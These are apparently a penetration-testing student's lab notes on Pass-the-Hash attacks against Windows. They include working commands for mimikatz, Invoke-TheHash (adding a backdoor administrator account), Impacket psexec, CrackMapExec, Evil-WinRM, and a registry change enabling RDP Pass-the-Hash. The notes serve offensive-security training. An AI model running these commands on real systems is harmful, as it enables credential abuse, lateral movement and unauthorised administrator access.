# Pass the Hash (PtH)_

`NTLM (RC4-HMAC) `

A pass the hash is exactly as it sounds. Nuff said...

- Dumping the local SAM database from a comprimised host.
- Extracting hashes from the NTDS database on a DC.
- Pulling hashes from memory (lsass.exe)

## Pass the Hash with mimikatz (Windows)_

The first tool we will use to perform a PtH attack is Mimikatz. It has a module named `sekurlsa::pth` that allows 
us to perform a PtH attack by starting a process using the hash of the user's password. To use this module, we 
will need the following:

	- /user - The username we want to impersonate.
	- /rc4 or /NTLM - NTLM hash of the user's password.
	- /domain - Domain the user to impersonate belongs to. 
		In the case of a local user account, we can use the computer name, localhost or a dot.
	- /run - The program we want to run with the user's context (if not specified, will launch cmd.exe)

```bash
mimikatz.exe privilege::debug "sekurlsa::pth /usr:julio /rc4:XXXXXXXXXXXX /domain:inlanefreight.htb /run:cmd.exe" exit
```

## Pass the Hash with Powershell Invoke-TheHash (Windows)

When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify 
the following parameters to execute commands in the target computer:

	- Target
	- Username
	- Domain
	- Hash
	- Command

The following command will use the SMB method for command execution to create a new user named Mark and add the 
user to the Administrator's group.

```bash
cd C:/Tools/Invoke-TheHash/

Import-Module ./Invoke-TheHash.psd1
Invoke-SMBExec -Target 192.168.1.105 -Domain inlanefreight.htb -Username julio -Hash XXXXXXXXXXX 
	-Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

```

## Pass the Hash with Impacket (Linux)

Impacket has several tools we can use for different operations such as Command Execution and Credential Dumping, 
Enumeration etc. FOr this example, we will perform command execution on the target machine using `PsExec`.

```bash
impacket-psexec administrator@10.129.201.126 -hashes :XXXXXXXXXXX
```

There are several other Impacket tools we can use for command execution using PtH:

	- impacket-wmiexec
	- impacket-atexec
	- impacket-smbexec

## Pass the Hash with CrackMapExec

```bash
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H XXXXXXXXXXXXXXX -x whoami
```

## Pass the Hash with Evil-WinRM

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H XXXXXXXXXXXXXXXXXX
```

## Pass the Hash with RDP (Linux)

- Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will 
be presented with the following error:

	`Account restrictions are preventing this user from signing in. For example: blank passwords aren't allowed, sign-in times are limited or a policy restriction has been enforced.
	`

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under 
`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Controls\Lsa` with the value of '0':
```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

then with RDP we do:

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:XXXXXXXXXXXXXXXX
```

## UAC Limits Pass the Hash for Local Accounts

User Account Control limits local users' ability7 to perform remote administration operations. When the registry 
key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to '0', 
it means that the built-in local admin account is the only local account allowed to perform remote administration 
tasks.

```
Note to self: I actually found this somewhere different - Research the reason for this ~

\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\MSSecurityGuide\ApplyUACRestrictionsToLocalAccountsOnNetworkLogon


There is one exception, if the registry key is enabled (value 1), the RID 500 account, even when renamed, is 
enrolled in UAC protection. This means that remote PtH will fail against the machine when using said account.
```

These settings are only for local administrative accounts. If we get access to a domain account with 
administrative rights on a computer, we can still use PtH with that computer. If you want to learn more about 
LocalAccountTokenFilterPolicy, check out this blog post by `Will Schroeder`: https://posts.specterops.io/pass-the-
hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167

